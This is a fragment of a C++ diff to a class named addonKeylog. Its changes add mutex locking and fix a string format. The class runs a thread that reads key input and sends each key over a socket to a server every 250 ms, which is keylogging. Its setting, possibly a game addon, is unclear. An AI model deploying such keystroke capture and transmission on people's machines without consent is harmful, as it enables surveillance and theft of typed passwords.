@@ -11,8 +11,6 @@
 addonKeylog *gKeylog;
 
 
-//extern addonThread *gThread;
-//extern addonMutex *gMutex;
 extern addonSocket *gSocket;
 
 extern std::queue<std::string> send_to;
@@ -25,7 +23,10 @@ addonKeylog::addonKeylog()
 {
 	addonDebug("Keylog constructor called");
 
+	boost::mutex::scoped_lock lock(this->Mutex);
 	this->threadActive = true;
+	lock.unlock();
+
 	boost::thread keylog(&addonKeylog::Thread);
 }
 
@@ -35,7 +36,9 @@ addonKeylog::~addonKeylog()
 {
 	addonDebug("Keylog deconstructor called");
 
+	boost::mutex::scoped_lock lock(this->Mutex);
 	this->threadActive = false;
+	lock.unlock();
 }
 
 
@@ -73,7 +76,7 @@ void addonKeylog::Thread()
 
 		strcpy_s(old_key, key);
 
-		gSocket->Send(formatString() << "TCPQUERY CLIENT_CALL" << " " << 1002 << " " << key);
+		gSocket->Send(formatString() << "TCPQUERY CLIENT_CALL " << 1002 << " " << key);
 
 		boost::this_thread::sleep(boost::posix_time::milliseconds(250));
 	}
